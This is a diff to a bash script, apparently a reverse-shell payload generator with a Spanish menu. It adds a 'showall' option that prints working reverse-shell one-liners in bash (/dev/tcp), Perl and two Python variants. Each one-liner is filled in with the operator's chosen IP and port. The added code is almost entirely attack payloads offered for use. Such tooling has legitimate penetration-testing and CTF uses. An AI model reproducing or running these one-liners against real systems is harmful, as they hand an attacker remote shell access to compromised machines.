@@ -75,6 +75,7 @@ function menu(){
             6) javam; opt=1;;
             7) gom; opt=1;;
             8) powerm; opt=1;;
+            9) showall; opt=1;;
             10) changeip; opt=1;;
             
             *) echo -e "${red}[!]${end} Seleccione una opcion valida ${red}[!]${end}";sleep 1.2; clear
@@ -285,6 +286,21 @@ function changeip(){
     aipi=$ipe
     portk=$portt
     menu
+}
+
+function showall(){
+    clear
+    echo -e "\n${red} > ${yellow}All Reverse Shells ${red}<${end}\n"
+    echo -e "${red}BASH${end}"
+    echo -e "${yellow}1 » ${end}${green}bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1${end}\n"
+    echo -e "${red}PERL${end}"
+    echo -e "${yellow}2 » ${end}${green}perl -e 'use Socket;"'$i'"""=""\"${red}$aipi${end}${green}\""";"'$p'"=${end}${red}$portk${end}${green};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in("'$p'",inet_aton("'$i'")))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'${end}\n"
+    echo -e "${red}PYTHON${end}"
+    echo -e "${yellow}3 » ${end}${green}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"""",\"-i\"]);'${end}\n"
+    echo -e "${yellow}4 » ${end}${green}python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${red}$portk${end}${green}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'${end}\n"
+
+
+
 }
 
 # FLUJO
